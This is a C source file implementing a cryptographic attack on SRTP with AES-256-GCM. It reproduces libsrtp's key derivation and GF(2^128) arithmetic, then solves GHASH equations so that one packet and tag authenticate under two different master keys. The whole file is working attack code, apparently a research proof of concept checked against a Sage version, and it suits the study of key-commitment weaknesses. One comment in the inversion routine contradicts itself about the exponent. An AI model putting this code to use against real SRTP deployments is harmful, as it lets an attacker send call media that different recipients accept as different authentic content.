/* attack_crypto.c — pure C port of the per-packet ambiguous-ciphertext
 * math from attack/crypto/{srtp_kdf,gcm}.sage. See attack_crypto.h for
 * the API. The companion test (test_attack_crypto.c) cross-checks every
 * primitive bit-for-bit against the sage implementation. */

#include "attack_crypto.h"

#include <string.h>

#include <mbedtls/aes.h>

/* ====================================================================
 * GF(2^128) in the GCM "shift-right" representation.
 *
 * Field elements are stored as two uint64_t halves (hi, lo). The mapping
 * from a 16-byte field block B[0..16] to this pair is:
 *     hi = be64_load(B + 0)   // bytes B[0..8]  big-endian
 *     lo = be64_load(B + 8)   // bytes B[8..16] big-endian
 * The MSB of B[0] (= bit 63 of hi) represents x^0; the LSB of B[15]
 * (= bit 0 of lo) represents x^127. The reducing polynomial is
 *     x^128 + x^7 + x^2 + x + 1
 * which, expressed as the field element x^7 + x^2 + x + 1 in this
 * representation, has hi=0xE100000000000000, lo=0.
 * ==================================================================== */

typedef struct {
    uint64_t hi;
    uint64_t lo;
} gf128_t;

static uint64_t be64_load(const uint8_t *p) {
    return ((uint64_t)p[0] << 56) | ((uint64_t)p[1] << 48) |
           ((uint64_t)p[2] << 40) | ((uint64_t)p[3] << 32) |
           ((uint64_t)p[4] << 24) | ((uint64_t)p[5] << 16) |
           ((uint64_t)p[6] << 8)  | ((uint64_t)p[7]);
}

static void be64_store(uint8_t *p, uint64_t v) {
    p[0] = (uint8_t)(v >> 56); p[1] = (uint8_t)(v >> 48);
    p[2] = (uint8_t)(v >> 40); p[3] = (uint8_t)(v >> 32);
    p[4] = (uint8_t)(v >> 24); p[5] = (uint8_t)(v >> 16);
    p[6] = (uint8_t)(v >> 8);  p[7] = (uint8_t)v;
}

static gf128_t gf_from_block(const uint8_t b[16]) {
    gf128_t g = { be64_load(b), be64_load(b + 8) };
    return g;
}

static void gf_to_block(gf128_t g, uint8_t b[16]) {
    be64_store(b,     g.hi);
    be64_store(b + 8, g.lo);
}

static gf128_t gf_zero(void) { gf128_t g = {0, 0}; return g; }

static int gf_is_zero(gf128_t g) { return g.hi == 0 && g.lo == 0; }

static gf128_t gf_add(gf128_t a, gf128_t b) {
    gf128_t z = { a.hi ^ b.hi, a.lo ^ b.lo };
    return z;
}

/* Multiplication in GF(2^128) (shift-right convention). Standard
 * textbook "schoolbook with reduction" algorithm; O(n^2) but a 128-bit
 * multiply finishes in well under a microsecond on contemporary x86/ARM,
 * which is more than enough for the per-packet attack budget. */
static gf128_t gf_mul(gf128_t a, gf128_t b) {
    gf128_t z = gf_zero();
    gf128_t v = a;
    static const uint64_t R_HI = 0xE100000000000000ULL;
    /* Iterate over bits of b in order x^0, x^1, ..., x^127.
     * x^0 = MSB of byte 0 = bit 63 of b.hi
     * x^63 = LSB of byte 7 = bit 0 of b.hi
     * x^64 = MSB of byte 8 = bit 63 of b.lo
     * x^127 = LSB of byte 15 = bit 0 of b.lo */
    for (int i = 0; i < 128; i++) {
        uint64_t word = (i < 64) ? b.hi : b.lo;
        int shift = 63 - (i & 63);
        int bit = (int)((word >> shift) & 1);
        if (bit) {
            z.hi ^= v.hi;
            z.lo ^= v.lo;
        }
        /* v <- v * x (multiply by x). In shift-right rep that is a
         * right shift by 1 across the (hi, lo) pair, with the bit
         * shifted off the bottom triggering the reduction XOR. */
        int carry = (int)(v.lo & 1);
        v.lo = (v.lo >> 1) | (v.hi << 63);
        v.hi = (v.hi >> 1);
        if (carry) {
            v.hi ^= R_HI;
        }
    }
    return z;
}

/* a^n in GF(2^128) via square-and-multiply. n >= 0. */
static gf128_t gf_pow(gf128_t a, uint64_t n) {
    /* a^0 = 1. In our representation the multiplicative identity is
     * x^0 = the single bit at position 0 of the field, which lives in
     * the MSB of byte 0 of the block representation. */
    gf128_t result = { 0x8000000000000000ULL, 0 };
    gf128_t base = a;
    while (n) {
        if (n & 1) result = gf_mul(result, base);
        base = gf_mul(base, base);
        n >>= 1;
    }
    return result;
}

/* a^{-1} = a^{2^128 - 2} (Fermat in the 2^128-element multiplicative
 * group: |F*| = 2^128 - 1, so a^{2^128-1} = 1 ⇒ a^{-1} = a^{2^128-2}).
 * Compute via square-and-multiply over the binary expansion of the
 * exponent: 2^128 - 2 = ...111110 in binary (126 ones from bit 1 to
 * bit 126, leading bit 127 also one, but actually 2^128 - 2 has bits 1
 * through 127 set). */
static gf128_t gf_inv(gf128_t a) {
    /* a^{2^128 - 2} = a^2 * a^4 * a^8 * ... * a^{2^127}
     * = (squaring loop) accumulate product after each squaring step
     *   starting from index 1 (since bit 0 is zero in 2^128-2).
     * Concretely: start with r = 1; for i=1..127: a = a^2; r = r * a;
     * After 127 squarings of a starting at a, the i-th value of 'a'
     * inside the loop is the original a raised to 2^i. */
    gf128_t r = { 0x8000000000000000ULL, 0 };   /* 1 */
    gf128_t v = a;
    for (int i = 1; i <= 127; i++) {
        v = gf_mul(v, v);          /* v = a^{2^i} */
        r = gf_mul(r, v);
    }
    return r;
}

/* ====================================================================
 * AES helpers via mbedtls.
 * ==================================================================== */

static void aes256_ecb_encrypt_block(const uint8_t key[32],
                                     const uint8_t in[16],
                                     uint8_t out[16]) {
    mbedtls_aes_context ctx;
    mbedtls_aes_init(&ctx);
    mbedtls_aes_setkey_enc(&ctx, key, 256);
    mbedtls_aes_crypt_ecb(&ctx, MBEDTLS_AES_ENCRYPT, in, out);
    mbedtls_aes_free(&ctx);
}

/* AES-CTR keystream that exactly matches what pycryptodome's GCM mode
 * uses for the body bytes: J_0 = nonce(12) || 0x00_00_00_01; the
 * keystream counter then advances starting at J_0 + 1 (the +1 because
 * J_0 is reserved for the tag mask). pycryptodome's
 *     AES.new(key, MODE_GCM, nonce=12B).encrypt(0^n)
 * does exactly that, so to be bit-for-bit identical we replicate it. */
static void aes256_gcm_body_keystream(const uint8_t key[32],
                                      const uint8_t nonce[12],
                                      uint8_t *buf, size_t n) {
    mbedtls_aes_context ctx;
    mbedtls_aes_init(&ctx);
    mbedtls_aes_setkey_enc(&ctx, key, 256);

    uint8_t counter[16];
    memcpy(counter, nonce, 12);
    /* J_0 = nonce || 0x00000001; for the body, we start AT J_0 + 1 =
     * nonce || 0x00000002 (counter increments before-use semantics of
     * mbedtls_aes_crypt_ctr). */
    counter[12] = 0x00;
    counter[13] = 0x00;
    counter[14] = 0x00;
    counter[15] = 0x02;

    uint8_t stream_block[16] = {0};
    size_t nc_off = 0;
    memset(buf, 0, n);
    mbedtls_aes_crypt_ctr(&ctx, n, &nc_off, counter, stream_block, buf, buf);
    mbedtls_aes_free(&ctx);
}

/* AES-CTR keystream for the SRTP-KDF (label-based derivation).
 * Replicates libsrtp's AES-CM-256-driven KDF: IV = master_salt(14)
 * zero-padded ‖ XORed with byte[7]=label, then 0x0000. We are passed a
 * 14-byte salt buffer (12-byte salt zero-extended by the caller). */
static void srtp_kdf_ctr(const uint8_t key[32], const uint8_t salt14[14],
                         uint8_t label, uint8_t *out, size_t out_len) {
    mbedtls_aes_context ctx;
    mbedtls_aes_init(&ctx);
    mbedtls_aes_setkey_enc(&ctx, key, 256);

    /* Build the KDF IV: 14-byte salt with byte[7] XORed by label, then
     * two zero bytes for the packet-index field. */
    uint8_t iv[16];
    memcpy(iv, salt14, 14);
    iv[7] ^= label;
    iv[14] = 0;
    iv[15] = 0;

    uint8_t stream_block[16] = {0};
    size_t nc_off = 0;
    memset(out, 0, out_len);
    mbedtls_aes_crypt_ctr(&ctx, out_len, &nc_off, iv, stream_block, out, out);
    mbedtls_aes_free(&ctx);
}

/* ====================================================================
 * Public API: SRTP-KDF + per-packet ambiguous ciphertext.
 * ==================================================================== */

int ambig_derive_session_keys(const uint8_t master_key_old[32],
                              const uint8_t master_salt_old[12],
                              const uint8_t master_key_new[32],
                              const uint8_t master_salt_new[12],
                              ambig_session_keys_t *out) {
    if (!master_key_old || !master_salt_old || !master_key_new ||
        !master_salt_new || !out) return -1;

    /* libsrtp zero-pads the 12-byte AEAD master_salt to 14 bytes before
     * running the legacy CTR KDF (srtp/srtp.c:1037-1041). We replicate
     * that, separately for each salt. */
    uint8_t salt14_old[14], salt14_new[14];
    memcpy(salt14_old, master_salt_old, 12);
    salt14_old[12] = 0; salt14_old[13] = 0;
    memcpy(salt14_new, master_salt_new, 12);
    salt14_new[12] = 0; salt14_new[13] = 0;

    /* label 0x00 → K_enc (32 B);  label 0x02 → S_session (12 B). */
    srtp_kdf_ctr(master_key_old, salt14_old, 0x00, out->k_enc_old, 32);
    srtp_kdf_ctr(master_key_new, salt14_new, 0x00, out->k_enc_new, 32);
    srtp_kdf_ctr(master_key_old, salt14_old, 0x02, out->s_session_old, 12);
    srtp_kdf_ctr(master_key_new, salt14_new, 0x02, out->s_session_new, 12);
    return 0;
}

static void build_packet_nonce(uint32_t ssrc, uint32_t roc, uint16_t seq,
                               const uint8_t s_session[12],
                               uint8_t nonce_out[12]) {
    uint8_t in_nonce[12];
    in_nonce[0] = 0; in_nonce[1] = 0;
    in_nonce[2]  = (uint8_t)(ssrc >> 24); in_nonce[3] = (uint8_t)(ssrc >> 16);
    in_nonce[4]  = (uint8_t)(ssrc >> 8);  in_nonce[5] = (uint8_t)ssrc;
    in_nonce[6]  = (uint8_t)(roc  >> 24); in_nonce[7] = (uint8_t)(roc  >> 16);
    in_nonce[8]  = (uint8_t)(roc  >> 8);  in_nonce[9] = (uint8_t)roc;
    in_nonce[10] = (uint8_t)(seq  >> 8);  in_nonce[11] = (uint8_t)seq;
    for (size_t i = 0; i < 12; i++) {
        nonce_out[i] = in_nonce[i] ^ s_session[i];
    }
}

int ambig_build_packet(const ambig_session_keys_t *keys, uint32_t ssrc,
                       uint32_t roc, uint16_t seq, const uint8_t *aad,
                       size_t aad_len, const uint8_t *plaintext,
                       size_t plaintext_len, size_t adjustment_offset,
                       uint8_t *out_ciphertext, uint8_t out_tag16[16]) {
    if (!keys || !plaintext || !out_ciphertext || !out_tag16) return -1;
    if (plaintext_len == 0 || (plaintext_len % 16) != 0) return -2;
    if ((adjustment_offset % 16) != 0 ||
        adjustment_offset + 16 > plaintext_len) return -3;

    uint8_t nonce_old[12], nonce_new[12];
    build_packet_nonce(ssrc, roc, seq, keys->s_session_old, nonce_old);
    build_packet_nonce(ssrc, roc, seq, keys->s_session_new, nonce_new);

    /* 1) Encrypt plaintext under K_enc_OLD via AES-CTR for the K_OLD
     * receiver. The 16-byte adjustment slot stays zero (the GHASH
     * solver will fill the matching ciphertext bytes). */
    aes256_gcm_body_keystream(keys->k_enc_old, nonce_old, out_ciphertext,
                              plaintext_len);
    for (size_t i = 0; i < plaintext_len; i++) {
        if (i >= adjustment_offset && i < adjustment_offset + 16) {
            out_ciphertext[i] = 0;
        } else {
            out_ciphertext[i] ^= plaintext[i];
        }
    }

    size_t n_ct_blocks = plaintext_len / 16;
    size_t correction_idx = adjustment_offset / 16;

    /* 2) Compute GHASH hash subkeys H_old, H_new = AES_K(0^128). */
    static const uint8_t zero_block[16] = {0};
    uint8_t H_old_b[16], H_new_b[16];
    aes256_ecb_encrypt_block(keys->k_enc_old, zero_block, H_old_b);
    aes256_ecb_encrypt_block(keys->k_enc_new, zero_block, H_new_b);
    gf128_t H_old = gf_from_block(H_old_b);
    gf128_t H_new = gf_from_block(H_new_b);

    /* 3) Compute tag masks T_old = AES_K_old(J0_old), T_new = ...(J0_new),
     *    J_0 = nonce || 0x00000001. */
    uint8_t j0_old[16], j0_new[16], tm_old_b[16], tm_new_b[16];
    memcpy(j0_old, nonce_old, 12);
    j0_old[12]=0; j0_old[13]=0; j0_old[14]=0; j0_old[15]=1;
    memcpy(j0_new, nonce_new, 12);
    j0_new[12]=0; j0_new[13]=0; j0_new[14]=0; j0_new[15]=1;
    aes256_ecb_encrypt_block(keys->k_enc_old, j0_old, tm_old_b);
    aes256_ecb_encrypt_block(keys->k_enc_new, j0_new, tm_new_b);
    gf128_t T_old = gf_from_block(tm_old_b);
    gf128_t T_new = gf_from_block(tm_new_b);

    /* 4) Build length blocks (AAD_bits || CT_bits). The two
     *    decryptions bind the SAME aad, so both length blocks are
     *    identical, but we keep them separately to mirror the sage
     *    code structure. */
    uint64_t aad_bits = (uint64_t)aad_len * 8;
    uint64_t ct_bits  = (uint64_t)plaintext_len * 8;
    uint8_t lb_b[16];
    be64_store(lb_b,     aad_bits);
    be64_store(lb_b + 8, ct_bits);
    gf128_t lb = gf_from_block(lb_b);

    /* 5) Build AAD block list (zero-padded to 16-byte boundary). */
    size_t n_aad_blocks = (aad_len + 15) / 16;
    gf128_t aad_blocks[64];
    if (n_aad_blocks > sizeof(aad_blocks) / sizeof(aad_blocks[0])) return -4;
    for (size_t i = 0; i < n_aad_blocks; i++) {
        uint8_t blk[16] = {0};
        size_t take = (i + 1) * 16 <= aad_len ? 16 : (aad_len - i * 16);
        memcpy(blk, aad + i * 16, take);
        aad_blocks[i] = gf_from_block(blk);
    }

    /* CT blocks (with the adjustment slot zero). */
    gf128_t ct_blocks[256];
    if (n_ct_blocks > sizeof(ct_blocks) / sizeof(ct_blocks[0])) return -5;
    for (size_t i = 0; i < n_ct_blocks; i++) {
        ct_blocks[i] = gf_from_block(out_ciphertext + i * 16);
    }

    /* 6) Compute base GHASH contributions for both keys, omitting the
     * adjustment block. Following sage's gcm_1block exactly:
     *   AC_k = aad_blocks ++ ct_blocks
     *   num_k = len(AC_k)
     *   abs_idx_k = n_aad + correction_idx
     *   sum_h_k = sum(H_k^(num_k + 1 - i) * AC_k[i]) for i != abs_idx_k
     *   coeff_k = H_k^(num_k - abs_idx_k + 1)
     *   a = coeff_1 + coeff_2
     *   b = sum_h_1 + sum_h_2 + len_block * H_1 + tm_old
     *                          + len_block * H_2 + tm_new
     *   X = b / a
     * Both keys see the SAME (aad_blocks, ct_blocks) so abs_idx is the
     * same on both sides, but the H powers differ. */
    size_t num_blocks = n_aad_blocks + n_ct_blocks;
    size_t abs_idx    = n_aad_blocks + correction_idx;

    gf128_t sum_h_old = gf_zero();
    gf128_t sum_h_new = gf_zero();
    for (size_t i = 0; i < num_blocks; i++) {
        if (i == abs_idx) continue;
        gf128_t blk = (i < n_aad_blocks) ? aad_blocks[i]
                                         : ct_blocks[i - n_aad_blocks];
        uint64_t exp = (uint64_t)(num_blocks + 1 - i);
        gf128_t pH_old = gf_pow(H_old, exp);
        gf128_t pH_new = gf_pow(H_new, exp);
        sum_h_old = gf_add(sum_h_old, gf_mul(pH_old, blk));
        sum_h_new = gf_add(sum_h_new, gf_mul(pH_new, blk));
    }

    uint64_t coeff_exp = (uint64_t)(num_blocks - abs_idx + 1);
    gf128_t coeff_old = gf_pow(H_old, coeff_exp);
    gf128_t coeff_new = gf_pow(H_new, coeff_exp);
    gf128_t a = gf_add(coeff_old, coeff_new);
    if (gf_is_zero(a)) return -6;     /* keys cancel; unrecoverable */

    gf128_t b = gf_add(sum_h_old, sum_h_new);
    b = gf_add(b, gf_mul(lb, H_old));
    b = gf_add(b, gf_mul(lb, H_new));
    b = gf_add(b, T_old);
    b = gf_add(b, T_new);

    gf128_t X = gf_mul(b, gf_inv(a));
    uint8_t X_b[16];
    gf_to_block(X, X_b);
    memcpy(out_ciphertext + adjustment_offset, X_b, 16);

    /* 7) Recompute the K_OLD tag from the now-completed ciphertext to
     * obtain the common tag. */
    gf128_t T_acc = gf_zero();
    for (size_t i = 0; i < num_blocks; i++) {
        gf128_t blk = (i < n_aad_blocks)
                          ? aad_blocks[i]
                          : (i - n_aad_blocks == correction_idx
                                 ? X
                                 : ct_blocks[i - n_aad_blocks]);
        uint64_t exp = (uint64_t)(num_blocks + 1 - i);
        T_acc = gf_add(T_acc, gf_mul(gf_pow(H_old, exp), blk));
    }
    T_acc = gf_add(T_acc, gf_mul(lb, H_old));
    T_acc = gf_add(T_acc, T_old);
    gf_to_block(T_acc, out_tag16);

    return 0;
}
